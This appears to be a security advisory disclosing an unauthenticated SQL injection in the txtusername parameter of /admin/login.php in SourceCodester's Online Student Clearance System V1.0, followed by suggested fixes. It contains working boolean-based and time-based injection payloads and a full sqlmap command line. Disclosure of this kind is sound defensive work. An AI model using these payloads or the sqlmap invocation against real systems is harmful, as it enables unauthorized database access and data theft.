# SourceCodester Online Student Clearance System V1.0 /admin/login.php txtusername parameter SQL injection
# NAME OF AFFECTED PRODUCT(S)
+ Online Student Clearance System in PHP and MySQL

## Vendor Homepage
+ [homepage](https://www.sourcecodester.com/php/17892/online-clearance-system.html)

# AFFECTED AND/OR FIXED VERSION(S)
## submitter
+ Angel

## Vulnerable File
+ /admin/login.php

## Vulnerability location:
+ 'txtusername' parameter

## VERSION(S)
+ V1.0

## Software Link
+ [Download Source Code](https://www.sourcecodester.com/sites/default/files/download/Senior%20Walter/student_clearance_system_aurthur_javis.zip)

# PROBLEM TYPE
## Vulnerability Type
+ SQL injection

## Root Cause
+ A SQL injection vulnerability was found in the '/admin/login.php' file of the 'Online Student Clearance System in PHP and MySQL Free Source Code' project. The reason for this issue is that attackers inject malicious code from the parameter 'txtusername' and use it directly in SQL queries without the need for appropriate cleaning or validation. This allows attackers to forge input values, thereby manipulating SQL queries and performing unauthorized operations.

## Impact
+ Attackers can exploit this SQL injection vulnerability to achieve unauthorized database access, sensitive data leakage, data tampering, comprehensive system control, and even service interruption, posing a serious threat to system security and business continuity.

# DESCRIPTION
+ During the security review of "Online Student Clearance System in PHP and MySQL Free Source Code", Angel discovered a critical SQL injection vulnerability in the "/admin/login.php" file. This vulnerability stems from insufficient user input validation of the 'txtusername' parameter, allowing attackers to inject malicious SQL queries. Therefore, attackers can gain unauthorized access to databases, modify or delete data, and access sensitive information. Immediate remedial measures are needed to ensure system security and protect data integrity.

# No login or authorization is required to exploit this vulnerability
# Vulnerability details and POC
## Vulnerability type:
+ <font style="color:#000000;">boolean-based blind</font>
+ <font style="color:#000000;">tiem-based blind</font>

## Payload:
```plain
---
Parameter: txtusername (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: txtusername=-7501' OR 9848=9848 OR 'TqEv'='NoeQ&txtpassword=1&btnlogin=

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: txtusername=1' AND (SELECT 9838 FROM (SELECT(SLEEP(5)))Nabu) OR 'GlVC'='KEGc&txtpassword=1&btnlogin=
---
```

## The following are screenshots of some specific information obtained from testing and running with the sqlmap tool:
```plain
sqlmap.py -u "172.20.10.5:2222/admin/login.php"  --data="txtusername=1&txtpassword=1&btnlogin=" --batch --level=5 --risk=3 --dbms=mysql --random-agent --tamper=space2comment
```

![](https://cdn.nlark.com/yuque/0/2025/png/38476061/1746457158495-2f2043d1-562c-41b1-864a-3094ca4c412d.png)

# Suggested repair
1. **Use prepared statements and parameter binding:**

Preparing statements can prevent SQL injection as they separate SQL code from user input data. When using prepare statements, the value entered by the user is treated as pure data and will not be interpreted as SQL code.

2. **Input validation and filtering:**

Strictly validate and filter user input data to ensure it conforms to the expected format.

3. **Minimize database user permissions:**

Ensure that the account used to connect to the database has the minimum necessary permissions. Avoid using accounts with advanced permissions (such as' root 'or' admin ') for daily operations.

4. **Regular security audits:**

Regularly conduct code and system security audits to promptly identify and fix potential security vulnerabilities.

